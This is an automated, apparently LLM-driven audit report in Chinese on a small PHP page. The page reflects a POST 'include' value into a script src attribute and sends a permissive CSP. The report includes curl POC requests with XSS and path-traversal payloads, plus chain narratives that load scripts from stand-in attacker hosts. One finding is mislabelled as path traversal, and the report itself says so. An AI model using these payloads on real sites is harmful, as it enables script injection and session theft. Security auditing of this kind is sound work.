# 落日二号乙漏洞挖掘报告 — 20261031-164207-c98ff3

- 生成时间：2026-10-31T08:43:11.446922+00:00
- 输入：`C:\Users\liyuf\Desktop\794\暴风星云裂\020.zip`
- 输入模式：`zip`
- SHA256：`f7bc24fccdcc53d2a999c3468bedf97d91c239734baf4f227ae7ef495dbe0b26`
- 文件：1（文本 1）
- 语言：php(1)
- 框架：未识别
- 端点：0
- 版本：1.0.0
- 严重度档位：`low`（min_confidence=0.6）
- 确定性规则候选生成：已禁用（zip 模式候选来自 LLM 深挖）
- 策略抑制候选：0 条
- 结构化报告：`report.json`（契约）、`report.schema.json`、`report.sarif`、`report.html`

## 1. 执行摘要

本次汇总基于单文件 PHP 脚本 020.php（27 行）的已去重 findings，共 4 条，全部带 POC（with_poc=4）。最高危为 020.php 第 15 行：$_POST['include'] 未编码直接拼入 <script src> 属性，同时被规则判为 path_traversal（GEN-dda61ef2bad8，high）与 client_side_validation（SEM-cc52c467496c，high），LLM 侧同点判为反射型 XSS（LLM-370901c0cb4c，medium，行 17）；另有第 3 行 CSP script-src 白名单过宽（SEM-582e93de1b73，medium）。需注意：该点本质是输出注入/属性注入，path_traversal 的类型标签与标题描述（“输出注入，非路径穿越”）不一致，交付时应以 XSS/输出编码缺失为主类型，path_traversal 标签需人工纠正。4 条 POC 均为 HTTP 型（POST 参数反射），但均未动态验证，仅为静态文本工件。

共 **4** 条 finding；**4** 条已生成 POC；**0** 条二次注入链；**0** 条 Prompt 注入迹象，隔离 **0** 个文件。

> 本管线不执行 POC、不搭建沙箱、不做动态验证。所有 verdict 为 `candidate` 或 `external`，需要在授权环境人工复核；URL 模式的 POC 由落日验证动态执行。

## 2. LLM 安全防护（SafetyGuard）

未检测到 Prompt 注入迹象。

## 2.1 LLM 深挖（LLM-finding / DeepFinder）

- 模式：`on`；工具调用：`0`（无 tools / tool_choice / function calling）
- 送入源码：1 个文件 / 1199 字符；截断 0 个
- 模型新增候选：1 条；同批重复合并：0 条；安全校验拒绝：0 条

模型覆盖说明：本次仅审计 code_pack 中唯一文件 020.php（27 行）。发现 1 条闭合链：POST 参数 include 未编码拼入 <script src> 属性导致反射型 XSS（020.php:13-17），且 CSP 白名单含公共 CDN 无法缓解。其余为攻击面测绘线索：文件未见 md5/sha1、rand/mt_rand、setcookie/session、exec/system、include $_GET 等调用，故 weak_hash/weak_random/insecure_cookie/命令注入等候选无代码证据，不单独立项。endpoints 为空、无配置文件与依赖清单，无法评估路由、认证与组件 CVE；020.php 是否对外可达需人工确认。

未覆盖 / 证据缺口：
- 无 php.ini/Web 服务器配置，无法确认运行环境与 CSP 实际生效
- endpoints 为空，无法确认路由与认证机制
- 无 composer.json，无法评估依赖组件 CVE
- 020.php 是否部署于 Web 根目录未确认

## 3. Findings

### F-1: 020.php 第 15 行 $_POST['include'] 未编码直接拼入 <script src> 属性（输出注入，非路径穿越）

- **类型**：`path_traversal` / CWE-22
- **严重度**：`high`
- **置信度**：`0.55`
- **结论**：`candidate` / 证据等级 `rule_verified+llm`
- **位置**：`020.php:13-15`
- **来源**：`rule`

**描述**

020.php:13-15：`if (isset ($_POST['include'])) { $page['body'] .= "\n\t<script src='" . $_POST['include'] . "'></script>"`。攻击者通过 POST 参数 include 提交任意字符串，该值未经 HTML 属性编码、未做 URL/协议白名单校验，直接拼接进 `<script src='...'>` 的单引号属性中。由于属性使用单引号包裹且未转义，输入中的单引号可闭合属性并注入新的 HTML 标签/属性（例如 `x' onerror='...` 或闭合后追加 `<script>`），属于反射型输出注入（HTML 注入 / 潜在 XSS）。候选将其归类为 path_traversal 不准确：此处不存在文件路径构造或文件访问，数据流终点是 HTML 响应体。

**source / sink**

- source：query `include`（020.php:15）
- sink：020.php:15 <script src='" . $_POST['include'] . "'></script>

**利用链**

| # | 位置 | 描述 | 数据状态 | 绕过原因 |
|---|---|---|---|---|
| 1 | `020.php:15` | 从 query `include` 读取外部输入 | 污点进入 src |  |
| 2 | `020.php:15` | 危险汇点：<script src='" . $_POST['include'] . "'></script> | 污点进入 path_traversal 汇点 | 未发现有效净化/参数化 |

**POC**

针对 /020（POST）的 路径穿越 / 任意文件读写 POC。注入点：POST 参数 include；payload 使用 TARGET 占位符。

1. **确认目标可达且已获授权**

```http
curl -sS -i 'http://TARGET:8080/020'
```
预期：返回应用页面/接口响应，而不是连接失败

2. **发送 路径穿越 / 任意文件读写 载荷**

```http
curl -sS -i -X POST 'http://TARGET:8080/020' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'include=..%2F..%2F..%2F..%2Ftmp%2Fsunset_GENdda61.txt'
```
预期：响应出现目标文件路径；若为写操作，TARGET 上出现 testfiles 目录之外的文件；若为读操作，响应包含文件内容。

3. **记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道**
预期：出现与基线不同的内容、状态码、延迟或副作用

- payload：`../../../../tmp/sunset_GENdda61.txt`
- POC 目录：`poc/GEN-dda61ef2bad8`
- 风险提示：POC 叙述未明确标注 source→sink 注入点, 原始 payload 未直接出现在请求文本中，可能经过 URL 编码
- 执行状态：未执行（`executed=False`）

**影响**

反射型 HTML/脚本注入：攻击者可构造恶意 POST 表单或自动提交页面，使受害者浏览器加载攻击者指定的脚本源或注入内联事件处理器，从而在目标站点源下执行任意 JavaScript，窃取会话 Cookie、发起 CSRF 操作或篡改页面内容。实际可利用性受第 3 行 CSP 限制（见 SEM-582e93de1b73），但 CSP 白名单包含多个第三方 CDN，若攻击者能在其中任一域托管脚本，则可绕过。

**CVE / CWE 论证**

CWE-79（跨站脚本）成立条件：外部可控输入（$_POST['include']）未经输出编码进入 HTML 属性上下文，且无需认证即可触发（仅需受害者提交/被诱导提交 POST）。利用链闭合：source=020.php:15 的 $_POST['include']，sink=同行的字符串拼接输出。注意：本候选原始类型标注为 CWE-22，与证据不符，应按输出注入评估。

**修复建议**

对输出到 HTML 属性的值使用 htmlspecialchars($v, ENT_QUOTES, 'UTF-8')；对 script src 使用 URL 白名单校验（仅允许 https 且域名在固定列表内）；优先改为服务端映射的固定脚本名而非用户可控 URL；收紧 CSP，移除不必要的第三方域并考虑 nonce/hash 机制。

**验证说明**

静态证据：入口 POST /020；source=query/include；sink=020.php:15；规则 php-include。未执行 POC、未搭建沙箱；建议在授权环境人工复核。
链叙事：攻击者构造包含单引号与标签的 POST 请求（include=x' onerror='alert(1) 或 include=x'><script src=//evil></script>）→ 020.php:13 isset 通过 → 020.php:15 直接拼接进 `<script src='...'>` → 响应返回给浏览器 → 属性被闭合，注入的标签/事件处理器执行。全程无文件系统操作，故不是路径穿越。
PocWriter 建议（未采纳，缺少端点 /020）：针对 020.php:15 的路径穿越（CWE-22）POC。POST 参数 include 在第二处文件操作 sink（第 15 行）同样未经规范化校验，可注入 ../ 序列访问预期目录之外的文件。目标地址使用 TARGET 占位符，仅限授权测试。
PocWriter 建议（未采纳，缺少端点 /020）：符合 CWE-22。漏洞位于 020.php:15，外部输入来自 POST 参数 include，source→sink 链在给定代码范围内静态闭合，未发现有效净化；具备远程触发条件。证据等级：llm_inferred（基于源码推断，未动态验证）。
POC 备注：POC 仅为文本工件，不执行、不联网。执行前将 TARGET 替换为授权测试实例；注意写操作副作用。

### F-2: 020.php 第 15 行外部脚本引入缺少服务端校验（CWE-602 客户端校验依赖）

- **类型**：`client_side_validation` / CWE-602
- **严重度**：`high`
- **置信度**：`0.4`
- **结论**：`candidate` / 证据等级 `rule_verified+llm`
- **位置**：`020.php:14-15`
- **来源**：`rule`

**描述**

020.php:14-15 将 `$_POST['include']` 拼入 `<script src='...'>`，由浏览器加载外部 JavaScript。候选标注为“客户端校验绕过”，但给定片段中并未出现任何客户端校验逻辑（无 JS 校验函数、无 onsubmit 校验），也未出现服务端对 include 值的合法性校验。实际问题是：脚本来源完全由用户输入决定，服务端未做任何白名单或协议校验，安全边界被交给浏览器/CSP 承担。

**source / sink**

- source：client `external JavaScript`（020.php）
- sink：020.php:15 	<script src='" . $_POST['include'] . "'></script>

**利用链**

| # | 位置 | 描述 | 数据状态 | 绕过原因 |
|---|---|---|---|---|
| 1 | `020.php:15` | 客户端脚本参与校验；需同时审计服务端是否重复校验 | 语义模式命中 | 需按 notes 中的运行时/跨文件条件复核 |

**POC**

针对 /020（POST）的 客户端校验绕过 POC。注入点：POST 参数 include；payload 使用 TARGET 占位符。

1. **确认目标可达且已获授权**

```http
curl -sS -i 'http://TARGET:8080/020'
```
预期：返回应用页面/接口响应，而不是连接失败

2. **发送 客户端校验绕过 载荷**

```http
curl -sS -i -X POST 'http://TARGET:8080/020' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'include=SUNSET_PROBE'
```
预期：按漏洞类型观察相应的异常响应/副作用。

3. **记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道**
预期：出现与基线不同的内容、状态码、延迟或副作用

- payload：`SUNSET_PROBE`
- POC 目录：`poc/SEM-cc52c467496c`
- 风险提示：POC 叙述未明确标注 source→sink 注入点
- 执行状态：未执行（`executed=False`）

**影响**

若依赖 CSP 或浏览器行为作为唯一防护，攻击者可指定任意外部脚本源；结合过宽 CSP（SEM-582e93de1b73），可在白名单域托管恶意脚本并在受害者上下文执行，导致会话劫持与数据泄露。

**CVE / CWE 论证**

CWE-602 指依赖客户端执行的安全决策。本片段中服务端未对 include 做校验，安全决策实际由浏览器加载行为与 CSP 承担，符合该模式；但片段内未见显式客户端校验代码，故证据部分不足。外部可达性：020.php 公开端点，无需认证。

**修复建议**

在服务端对 include 值执行严格白名单校验（固定脚本名映射或域名白名单 + https 强制），拒绝任何非预期值；不要将安全决策交给浏览器或 CSP；对输出做 HTML 属性编码。

**验证说明**

静态证据：入口 POST /020；source=client/external JavaScript；sink=020.php:15；规则 php-client-validation。未执行 POC、未搭建沙箱；建议在授权环境人工复核。
链叙事：攻击者提交 POST include=//attacker.example/x.js → 020.php:15 拼接为 `<script src='//attacker.example/x.js'>` → 服务端无校验直接返回 → 浏览器尝试加载外部脚本。若 CSP 未拦截（白名单域或策略缺失），脚本执行。
PocWriter 建议（未采纳，缺少端点 /020）：针对 020.php:15 的客户端校验绕过（CWE-602）POC。若安全校验仅在前端 JavaScript 实现而服务端未复验，直接构造 POST 请求即可绕过。目标地址使用 TARGET 占位符，仅限授权测试。
PocWriter 建议（未采纳，缺少端点 /020）：符合 CWE-602。问题位于 020.php:15，校验依赖客户端 JavaScript，服务端缺少等价复验。证据等级：llm_inferred（基于源码推断，未动态验证）；具体校验字段需补充源码确认。
POC 备注：POC 仅为文本工件，不执行、不联网。当前载荷为探测值，实际绕过载荷需依据 020.php:15 的具体校验逻辑补充；若无法确认校验字段，应在 preconditions 标注需补充源码。

### F-3: 020.php 中 POST 参数 include 未编码直接拼入 <script src> 导致反射型 XSS

- **类型**：`xss` / CWE-79
- **严重度**：`medium`
- **置信度**：`0.9`
- **结论**：`candidate` / 证据等级 `llm_inferred`
- **位置**：`020.php:13-17`
- **来源**：`llm_finding`

**描述**

020.php 第 13-17 行读取 $_POST['include']，未做任何 HTML 属性编码或白名单校验，直接拼接进 <script src='...'> 的 src 属性并输出到响应体。攻击者可提交包含单引号闭合属性的 payload（如 `' onerror='alert(1)` 或 `'></script><script>alert(1)</script>`），突破 script 标签属性上下文，注入任意 HTML/JS。虽然页面设置了 CSP（第 3-5 行），但 CSP 的 script-src 白名单包含 unpkg.com、cdn.jsdelivr.net、pastebin.com 等可托管任意 JS 的公共 CDN，攻击者可借助这些域加载自己的脚本，CSP 无法阻止。

**source / sink**

- source：body `include`（020.php）
- sink：020.php:17 字符串拼接后输出到 HTML 响应体（$page['body'] 中的 <script src='...'>）

**利用链**

| # | 位置 | 描述 | 数据状态 | 绕过原因 |
|---|---|---|---|---|
| 1 | `020.php:13` | isset($_POST['include']) 判断参数存在 | 攻击者完全可控的字符串 |  |
| 2 | `020.php:15` | 将 $_POST['include'] 直接拼接到 <script src='...'> 属性中，无 htmlspecialchars/白名单 | 原始未编码字符串进入 HTML 属性上下文 | 无任何编码或校验；单引号可闭合 src 属性 |
| 3 | `020.php:18` | $page['body'] 最终输出到响应，浏览器解析执行注入的 HTML/JS | 注入的标签/事件处理器被浏览器执行 |  |

**POC**

针对 /020.php（POST）的 跨站脚本 POC。注入点：POST 参数 include；payload 使用 TARGET 占位符。

1. **确认目标可达且已获授权**

```http
curl -sS -i 'http://TARGET:8080/020.php'
```
预期：返回应用页面/接口响应，而不是连接失败

2. **发送 跨站脚本 载荷**

```http
curl -sS -i -X POST 'http://TARGET:8080/020.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'include=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
```
预期：响应中脚本未编码，浏览器执行并弹出 document.domain。

3. **记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道**
预期：出现与基线不同的内容、状态码、延迟或副作用

- payload：`<script>alert(document.domain)</script>`
- POC 目录：`poc/LLM-370901c0cb4c`
- 风险提示：POC 叙述未明确标注 source→sink 注入点, 原始 payload 未直接出现在请求文本中，可能经过 URL 编码
- 执行状态：未执行（`executed=False`）

**影响**

反射型 XSS，可在受害者浏览器上下文执行任意 JS，窃取会话/发起 CSRF/钓鱼；CSP 因白名单含公共 CDN 而无法有效缓解

**CVE / CWE 论证**

CWE-79：外部可达、无需认证，source（$_POST['include']）到 sink（HTML 输出）链路完整闭合，无编码/校验

**修复建议**

对 include 值使用 htmlspecialchars($v, ENT_QUOTES) 编码；或仅允许 CSP 白名单内的固定域名并做严格 URL 校验；收紧 CSP 移除可托管任意内容的公共 CDN

**验证说明**

需确认 020.php 对外可达及部署方式；CSP 实际生效情况需动态验证
模型 POC 要点：提交带属性闭合的 include 值，注入 onerror 事件处理器；或借助 CSP 白名单域加载外部脚本
LLM 深挖（AutoCVE Finding 风格）：单次调用、无工具；文件与行号已校验，代码片段由真实源码回填。
PocWriter 建议（未采纳，缺少端点 /020.php）：针对 020.php:17 的反射型 XSS（CWE-79）POC。POST 参数 include 的值未经 HTML 编码即回显到响应页面，可注入 <script> 执行任意脚本。目标地址使用 TARGET 占位符，仅限授权测试。
PocWriter 建议（未采纳，缺少端点 /020.php）：符合 CWE-79。漏洞位于 020.php:17，外部输入来自 POST body 参数 include，source→sink 链在给定代码范围内静态闭合，未发现有效净化；具备远程触发条件。证据等级：llm_inferred（基于源码推断，未动态验证）。
POC 备注：POC 仅为文本工件，不执行、不联网。验证时在浏览器中打开构造的请求或使用代理重放，观察弹窗；不要对生产用户投放。

### F-4: 020.php 第 3 行 CSP script-src 白名单过宽（CWE-693 防护机制失效）

- **类型**：`csp` / CWE-693
- **严重度**：`medium`
- **置信度**：`0.7`
- **结论**：`candidate` / 证据等级 `rule_verified+llm`
- **位置**：`020.php:2-3`
- **来源**：`rule`

**描述**

020.php:3 定义 `$headerCSP = "Content-Security-Policy: script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com unpkg.com cdn.jsdelivr.net digi.ninja ;"`。该策略允许从 pastebin.com、hastebin.com、unpkg.com、cdn.jsdelivr.net 等用户可发布内容的第三方站点加载脚本。这些站点允许任意用户上传/托管 JS，因此 CSP 无法有效阻止攻击者注入的 `<script src>` 指向其托管内容，防护形同虚设。此外策略中缺少 object-src 'none'、base-uri 等指令，且未使用 nonce/hash。

**source / sink**

- source：body `include`（020.php）
- sink：020.php:3 $headerCSP = "Content-Security-Policy: script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com unpkg.com cdn.jsdelivr.net digi.ninja ;"; // allows js from various trusted locations

**利用链**

| # | 位置 | 描述 | 数据状态 | 绕过原因 |
|---|---|---|---|---|
| 1 | `020.php:3` | CSP 与可控脚本来源联动；需检查最终响应和浏览器加载结果 | 语义模式命中 | 需按 notes 中的运行时/跨文件条件复核 |

**POC**

针对 /020（POST）的 CSP 配置缺陷 POC。注入点：POST 参数 include；payload 使用 TARGET 占位符。

1. **确认目标可达且已获授权**

```http
curl -sS -i 'http://TARGET:8080/020'
```
预期：返回应用页面/接口响应，而不是连接失败

2. **发送 CSP 配置缺陷 载荷**

```http
curl -sS -i -X POST 'http://TARGET:8080/020' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'include=SUNSET_PROBE'
```
预期：响应包含 Content-Security-Policy，检查 script-src 是否允许过宽的外部脚本源。

3. **记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道**
预期：出现与基线不同的内容、状态码、延迟或副作用

- payload：`SUNSET_PROBE`
- POC 目录：`poc/SEM-582e93de1b73`
- 风险提示：POC 叙述未明确标注 source→sink 注入点
- 执行状态：未执行（`executed=False`）

**影响**

CSP 作为 XSS 缓解措施失效：结合 020.php:15 的输出注入，攻击者可将脚本托管在 pastebin/hastebin/unpkg/jsdelivr 等白名单域，使注入的 `<script src>` 通过 CSP 校验并在受害者浏览器执行，导致会话劫持、页面篡改、凭证窃取。

**CVE / CWE 论证**

CWE-693（防护机制失效）：CSP 是用于缓解 XSS 的安全控制，但其 script-src 白名单包含可被任意用户写入内容的域，控制未达到设计目的。该缺陷为配置型弱点，无需污点链即可成立；外部可达性由 020.php 的公开 HTTP 端点保证，无需认证。

**修复建议**

将 script-src 收紧为 'self' 加必要的固定业务域，移除 pastebin/hastebin/unpkg/jsdelivr 等用户内容托管域；引入 nonce 或 hash 机制；补充 object-src 'none'、base-uri 'self'、frame-ancestors 'none'；对第三方脚本使用 SRI 完整性校验。

**验证说明**

静态证据：入口 POST /020；source=body/include；sink=020.php:3；规则 php-csp-policy。未执行 POC、未搭建沙箱；建议在授权环境人工复核。
链叙事：攻击者利用 020.php:15 的属性注入写入 `<script src='https://pastebin.com/raw/xxx'>` → 浏览器按 020.php:3 的 CSP 校验 → pastebin.com 在白名单内，脚本被允许加载执行 → XSS 达成。CSP 本应阻断该链路，但因白名单过宽而失效。
PocWriter 建议（未采纳，缺少端点 /020）：针对 020.php:3 的 CSP 配置缺陷（CWE-693）POC。该处涉及安全响应头/策略配置，需检查响应中 Content-Security-Policy 是否存在及 script-src 是否过宽。目标地址使用 TARGET 占位符，仅限授权测试。
PocWriter 建议（未采纳，缺少端点 /020）：符合 CWE-693。问题位于 020.php:3 的安全头/策略配置，属配置型候选，无 HTTP 污点但需检查响应头标志位。证据等级：llm_inferred（基于源码推断，未动态验证）。
POC 备注：POC 仅为文本工件，不执行、不联网。验证以响应头为准，需人工确认具体 CSP 指令；若源码未实际输出 CSP 头，应结合 020.php:3 代码复核。

## 4. 二次注入（SecondOrderAnalyzer）

本次未发现 store→read→sink 闭环的二次注入链。

## 5. AWVS 联动

- 输入模式：`zip`
- 导入结果：0 条
- 关联明细：0 条
- 目标种子：`awvs/targets.json`
- 说明：AWVS 是外部动态扫描器；本管线只导入其结果做佐证，或导出端点供 AWVS 播种。

## 6. 漏洞类型覆盖

| 类型 | CWE | AutoCVE | 本次数量 |
|---|---|---|---|
| `command_injection` | CWE-78 | 是 | 0 |
| `sql_injection` | CWE-89 | 是 | 0 |
| `ssrf` | CWE-918 | 是 | 0 |
| `path_traversal` | CWE-22 | 是 | 1 |
| `deserialization` | CWE-502 | 是 | 0 |
| `ssti` | CWE-1336 | 是 | 0 |
| `auth_bypass` | CWE-287 | 是 | 0 |
| `idor` | CWE-639 | 是 | 0 |
| `xxe` | CWE-611 | 是 | 0 |
| `xss` | CWE-79 | 是 | 1 |
| `business_logic` | CWE-840 | 是 | 0 |
| `other` | CWE-693 | 是 | 0 |
| `rce` | CWE-94 |  | 0 |
| `code_injection` | CWE-94 |  | 0 |
| `expression_injection` | CWE-917 |  | 0 |
| `ldap_injection` | CWE-90 |  | 0 |
| `xpath_injection` | CWE-643 |  | 0 |
| `open_redirect` | CWE-601 |  | 0 |
| `csrf` | CWE-352 |  | 0 |
| `file_upload` | CWE-434 |  | 0 |
| `race_condition` | CWE-367 |  | 0 |
| `weak_crypto` | CWE-327 |  | 0 |
| `weak_hash` | CWE-328 |  | 0 |
| `weak_random` | CWE-330 |  | 0 |
| `hardcoded_secret` | CWE-798 |  | 0 |
| `trust_boundary` | CWE-501 |  | 0 |
| `log_injection` | CWE-117 |  | 0 |
| `insecure_cookie` | CWE-614 |  | 0 |
| `information_disclosure` | CWE-200 |  | 0 |
| `api_info_disclosure` | CWE-200 |  | 0 |
| `captcha_bypass` | CWE-804 |  | 0 |
| `csp` | CWE-693 |  | 1 |
| `weak_id` | CWE-330 |  | 0 |
| `client_side_validation` | CWE-602 |  | 1 |
| `brute_force` | CWE-307 |  | 0 |
| `second_order_injection` | CWE-89 |  | 0 |
| `prompt_injection` | CWE-1426 |  | 0 |

## 7. 运行阶段

| agent | 代号 | 耗时(s) | 使用 LLM |
|---|---|---|---|
| safety_guard | 安全防护 | 3.52 | 是 |
| surface_mapper | 攻击面测绘 | 6.85 | 是 |
| deep_finder | LLM 深挖 | 7.39 | 是 |
| candidate_screener | 候选筛选 | 6.44 | 是 |
| vulnerability_analyzer | 漏洞分析 | 16.19 | 是 |
| second_order_analyzer | 二次注入分析 | 0.0 | 否 |
| poc_writer | POC 生成 | 15.77 | 是 |
| coordinator | 管线协调 | 8.17 | 是 |

## 8. 限制

- 只做源码静态分析，不构建、不部署、不执行 POC、不搭建沙箱；
- finding 的 `verdict` 为 `candidate`，不是动态确认；
- 需要授权环境、人工复核与 AWVS 结果才能升级为 confirmed；
- 被 SafetyGuard 隔离的文件正文不会进入 LLM；隔离文件不会产生静态候选。
